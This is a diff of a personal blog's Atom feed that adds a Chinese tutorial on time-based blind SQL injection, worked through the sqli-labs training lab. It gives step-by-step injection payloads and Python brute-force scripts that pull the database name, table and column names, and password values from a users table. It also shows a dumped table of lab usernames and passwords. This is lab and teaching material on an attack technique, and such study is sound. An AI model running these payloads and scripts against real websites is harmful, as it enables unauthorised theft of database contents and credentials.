@@ -1,4 +1,208 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-08-11T15:55:30+08:00</updated><id>http://localhost:4000/</id><title type="html">Evil</title><subtitle>Catcher's blog</subtitle><author><name>Catcher</name></author><entry><title type="html">时间盲注的套路</title><link href="http://localhost:4000/2018/08/11/time_ij/" rel="alternate" type="text/html" title="时间盲注的套路" /><published>2018-08-11T00:00:00+08:00</published><updated>2018-08-11T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/11/time_ij</id><content type="html" xml:base="http://localhost:4000/2018/08/11/time_ij/">&lt;p&gt;记录时间盲注的套路以及通用的暴破脚本，这里通过一道题来看 — sqli-labs Less-9(基于时间的GET单引号盲注)。&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-08-11T21:41:09+08:00</updated><id>http://localhost:4000/</id><title type="html">Evil</title><subtitle>Catcher's blog</subtitle><author><name>Catcher</name></author><entry><title type="html">时间盲注的套路</title><link href="http://localhost:4000/2018/08/11/time_ij/" rel="alternate" type="text/html" title="时间盲注的套路" /><published>2018-08-11T00:00:00+08:00</published><updated>2018-08-11T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/11/time_ij</id><content type="html" xml:base="http://localhost:4000/2018/08/11/time_ij/">&lt;p&gt;记录时间盲注的套路以及通用的暴破脚本，这里通过一道题来看 — sqli-labs Less-9(基于时间的GET单引号盲注)。&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h2 id=&quot;0x01-预备&quot;&gt;0x01 预备&lt;/h2&gt;
+
+&lt;p&gt;所谓基于时间的盲注，就是页面不会给你任何有价值的回显。要想识别该漏洞，可以向数据库注入时间延迟，并检查服务器的响应是否也已经产生了延迟。&lt;/p&gt;
+
+&lt;h3 id=&quot;1-注入点判断&quot;&gt;1. 注入点判断&lt;/h3&gt;
+
+&lt;p&gt;先进行一些尝试&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1 ---&amp;gt; you are in~
+id=1' ---&amp;gt; you are in~
+id=1'--+ ---&amp;gt; you are in~
+
+id=1' and sleep(5) --+ ---&amp;gt; 延时 5 秒，说明可以进行时间注入
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;2-时间盲注中常用延时函数&quot;&gt;2. 时间盲注中常用延时函数&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sleep()	适用 MySQL 5，延时时间执行。
+benchmark()	适用 MySQL 4/5 ，延时时间执行。 ---&amp;gt; benchmark(10000000,encode('hello','mom')) 执行该语句需要约 3.6 秒
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;**if语句：&lt;code class=&quot;highlighter-rouge&quot;&gt;if(expr1,expr2,expr3)&lt;/code&gt; 若expr1为真，返回expr2，否则返回expr3 **&lt;/p&gt;
+
+&lt;p&gt;**注入时候是根据 sleep(5) 并结合 if(,,) 判断来的，条件正确就有五秒延迟，不正确就没有五秒延迟。 **&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),0)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;0x02--构造-payload&quot;&gt;0x02  构造 Payload&lt;/h2&gt;
+
+&lt;h3 id=&quot;1-猜数据库长度&quot;&gt;1. 猜数据库长度&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and if(length(database())=X,sleep(5),0)--+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#encoding: utf-8&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://192.168.1.102/sqli/Less-8/?id=1' and if(length(database())={},sleep(5),0)--+&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uppercase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lowercase&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exceptions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; 
+		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;2-猜数据库名&quot;&gt;2. 猜数据库名&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and if(ascii(substr(database(),XX1,XX2))=XX3,sleep(5),0)--+
+或
+id=1' and if(ascii(substr(database(),XX1,XX2))&amp;gt;=XX3,sleep(5),0)--+
+
+XX1: 是数据库名称(字符串)不同的位置 1-8
+XX2: 截取的字符长度 1
+XX3: 截取的字符 ascii 码值
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;采用二分法提高下效率：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#encoding: utf-8&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://192.168.1.102/sqli/Less-8/?id=1' and if(ascii(substr(database(),{},1))&amp;gt;={},sleep(5),0)--+&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uppercase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lowercase&lt;/span&gt;
+
+
+&lt;span class=&quot;n&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;database_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database_len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;right&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;122&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;right&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exceptions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;3猜表的长度&quot;&gt;3.猜表的长度&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and if((select length(table_name) from information_schema.tables where table_schema=database() limit XX1,XX2)=XX3,sleep(5),0)--+
+
+XX1: limit 第一个参数，指定第一个返回记录行的偏移量，从 0 开始，改变这里来求出所有表的长度
+XX2: limit 第二个参数，指定返回记录行的最大数目
+XX3: 猜测的表的长度
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;脚本基本一样就不放了。&lt;/p&gt;
+
+&lt;h3 id=&quot;4-猜表名&quot;&gt;4. 猜表名&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit XX1,XX2),XX3,XX4)))=XX5,sleep(5),0) --+
+
+XX1: limit 第一个参数，指定第一个返回记录行的偏移量
+XX2: limit 第二个参数，指定返回记录行的最大数目
+XX3: 是表名称(字符串)不同的位置 
+XX4: 截取的字符长度 1
+XX5: 截取的字符 ascii 码值
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;脚本基本一样就不放了。&lt;/p&gt;
+
+&lt;h3 id=&quot;5猜字段的长度&quot;&gt;5.猜字段的长度&lt;/h3&gt;
+
+&lt;p&gt;这跟前面猜表长度那里基本一样了&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and if((select length(column_name) from information_schema.columns where table_schema=database() and table_name='users' limit XX1,XX2)=XX3,sleep(5),0) --+
+
+XX1: limit 第一个参数，指定第一个返回记录行的偏移量，从 0 开始，改变这里来求出所有字段的长度
+XX2: limit 第二个参数，指定返回记录行的最大数目
+XX3: 猜测的字段的长度
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;脚本基本一样就不放了。&lt;/p&gt;
+
+&lt;h3 id=&quot;6猜字段名&quot;&gt;6.猜字段名&lt;/h3&gt;
+
+&lt;p&gt;这里跟前面猜表名那里基本一样&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and if((ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit XX1,XX2),XX3,XX4)))=XX5,sleep(5),0) --+
+
+XX1: limit 第一个参数，指定第一个返回记录行的偏移量  2
+XX2: limit 第二个参数，指定返回记录行的最大数目
+XX3: 是字段名(字符串)不同的位置 
+XX4: 截取的字符长度 1
+XX5: 截取的字符 ascii 码值
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;脚本基本一样就不放了。&lt;/p&gt;
+
+&lt;h3 id=&quot;7-猜目标数据的长度&quot;&gt;7. 猜目标数据的长度&lt;/h3&gt;
+
+&lt;p&gt;通过之前我们知道了：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;数据库 : security
+表：users
+目标字段: password (这里就暂且取一个目标字段作为例子)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;还是跟之前的一样&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and if((select length(password) from users limit 0,1)=X,sleep(5),0) --+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;8-猜目标数据&quot;&gt;8. 猜目标数据&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and if((ascii(substr((select password from users limit 0,1),XX1,1)))=XX2,sleep(5),0) --+
+
+XX1: 目标数据(字符串)每个字符的位置
+XX2: 目标数据字符串中字符的 ascii 码值
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;至此一次时间盲注就完成了。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x03-使用工具&quot;&gt;0x03 使用工具&lt;/h2&gt;
+
+&lt;h3 id=&quot;1-burpsuite&quot;&gt;1. burpsuite&lt;/h3&gt;
+
+&lt;p&gt;使用 burpsuite 来玩的话，跟暴破密码的路数基本一样，就不多说了。&lt;/p&gt;
+
+&lt;h3 id=&quot;2-sqlmap&quot;&gt;2. sqlmap&lt;/h3&gt;
+
+&lt;p&gt;跟布尔盲注时一样，就不再赘述了。&lt;/p&gt;</content><author><name>Catcher</name></author><summary type="html">记录时间盲注的套路以及通用的暴破脚本，这里通过一道题来看 — sqli-labs Less-9(基于时间的GET单引号盲注)。</summary></entry><entry><title type="html">布尔盲注的套路</title><link href="http://localhost:4000/2018/08/11/bool_ij/" rel="alternate" type="text/html" title="布尔盲注的套路" /><published>2018-08-11T00:00:00+08:00</published><updated>2018-08-11T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/11/bool_ij</id><content type="html" xml:base="http://localhost:4000/2018/08/11/bool_ij/">&lt;p&gt;记录布尔盲注的套路以及通用的暴破脚本，这里通过一道题来看 — sqli-labs Less-8(布尔型单引号GET盲注)。&lt;/p&gt;
 
 &lt;!--more--&gt;
 
@@ -18,16 +222,17 @@ you are in~ 相当于回显了 true
 
 &lt;h3 id=&quot;2-盲注中常用-mysql-相关函数&quot;&gt;2. 盲注中常用 MySQL 相关函数&lt;/h3&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;length(str)：返回str字符串的长度。
-substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始
-mid(str,pos,len):跟上面的一样，截取字符串
-ascii(str)：返回字符串str的最左面字符的ASCII代码值。
-ord(str):同上，返回ascii码
-if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&amp;gt;2,1,0),返回0
-select database()查询数据库
-ascii(substr((select database()),1,1))：返回数据库名称的第一个字母,转化为ascii码
-ascii(substr((select database()),1,1))&amp;gt;64：ascii大于64就返回true，if就返回1，否则返回0
-常见的ASCII，A:65,Z:90 a:97,z:122,  0:48, 9:57
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;length(str): 返回str字符串的长度。
+substr(str, pos, len): 将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始
+mid(str,pos,len): 跟上面的一样，截取字符串
+ascii(str): 返回字符串str的最左面字符的ASCII代码值。
+ord(str): 同上，返回ascii码
+if(a,b,c): a为条件，a为true，返回b，否则返回c，如if(1&amp;gt;2,1,0),返回0
+select database() 查询数据库
+ascii(substr((select database()),1,1)): 返回数据库名称的第一个字母,转化为ascii码
+ascii(substr((select database()),1,1))&amp;gt;64: ascii大于64就返回true，if就返回1，否则返回0
+
+常见的ASCII: A:65,Z:90 a:97,z:122, 0:48, 9:57
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;0x02--构造-payload&quot;&gt;0x02  构造 Payload&lt;/h2&gt;
@@ -283,292 +488,28 @@ Table: users
 | 12 | dhakkan  | dumbo      |
 | 14 | admin4   | admin4     |
 +----+----------+------------+
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Catcher</name></author><summary type="html">记录时间盲注的套路以及通用的暴破脚本，这里通过一道题来看 — sqli-labs Less-9(基于时间的GET单引号盲注)。</summary></entry><entry><title type="html">布尔盲注的套路</title><link href="http://localhost:4000/2018/08/11/bool_ij/" rel="alternate" type="text/html" title="布尔盲注的套路" /><published>2018-08-11T00:00:00+08:00</published><updated>2018-08-11T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/11/bool_ij</id><content type="html" xml:base="http://localhost:4000/2018/08/11/bool_ij/">&lt;p&gt;记录布尔盲注的套路以及通用的暴破脚本，这里通过一道题来看 — sqli-labs Less-8(布尔型单引号GET盲注)。&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Catcher</name></author><summary type="html">记录布尔盲注的套路以及通用的暴破脚本，这里通过一道题来看 — sqli-labs Less-8(布尔型单引号GET盲注)。</summary></entry><entry><title type="html">Git常用命令</title><link href="http://localhost:4000/2018/08/11/git/" rel="alternate" type="text/html" title="Git常用命令" /><published>2018-08-11T00:00:00+08:00</published><updated>2018-08-11T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/11/git</id><content type="html" xml:base="http://localhost:4000/2018/08/11/git/">&lt;p&gt;记录那些常用的 git 命令，持续更新……&lt;/p&gt;
 
 &lt;!--more--&gt;
 
-&lt;h2 id=&quot;0x01-预备&quot;&gt;0x01 预备&lt;/h2&gt;
+&lt;h3 id=&quot;1修改之后提交&quot;&gt;1.修改之后提交&lt;/h3&gt;
 
-&lt;h3 id=&quot;1-注入点判断&quot;&gt;1. 注入点判断&lt;/h3&gt;
-
-&lt;p&gt;先进行一些尝试&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1 ---&amp;gt; you are in~
-id=1' ---&amp;gt; 什么都没有回显  
-id=1'--+ ---&amp;gt; you are in~
-
-you are in~ 相当于回显了 true
-什么都没有回显 相当于回显了 false
